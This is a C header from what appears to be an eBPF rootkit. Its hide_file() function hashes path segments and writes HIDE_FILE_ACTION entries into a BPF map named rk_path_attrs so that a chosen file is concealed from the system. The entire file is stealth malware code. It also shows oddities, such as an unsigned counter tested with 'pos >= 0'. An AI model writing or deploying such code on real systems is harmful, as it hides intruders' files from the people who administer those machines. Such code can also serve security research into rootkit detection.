#ifndef __LIB_H
#define __LIB_H

#include <linux/kconfig.h>
#include <linux/ptrace.h>
#include <linux/types.h>
#include <linux/version.h>
#include <linux/dirent.h>

#include "include/bpf.h"
#include "include/bpf_helpers.h"

#include "common.h"
#include "hash.h"

static __attribute__((always_inline)) void hide_file(const char *fs_type, const char *dir, const char *file)
{
    u64 fs_hash = FNV_BASIS;
    update_hash_str(&fs_hash, fs_type);

    u64 file_hash = FNV_BASIS;
    update_hash_str(&file_hash, file);

    struct rk_path_attr_t attr = {
        .fs_hash = fs_hash,
        .action.id = HIDE_FILE_ACTION,
        .action.hidden_hash = file_hash,
    };

    u64 pos = 0;

#pragma unroll
    for (int i = 0; i != MAX_SEGMENT_LENGTH; i++)
    {
        if (IS_PATH_SEP(file[i]))
            pos++;
    }
    pos--;


    char name[32];
    u64 offset = 0, hash;

    struct rk_path_key_t key = {};

#pragma unroll
    for (int i = 0; i != MAX_SEGMENT_LENGTH; i++)
    {
        if (pos >= 0 && (IS_PATH_SEP(dir[i])))
        {
            name[offset] = '\0';

            hash = FNV_BASIS;
            update_hash_str(&hash, name);

            key.hash = hash;
            key.pos = pos;

            bpf_map_update_elem(&rk_path_attrs, &key, &attr, BPF_ANY);

            attr.action.id = 0;
            offset = 0;
            pos--;
        }
        else
        {
            name[offset&31] = dir[i];
            offset++;
        }
    }
}

#endif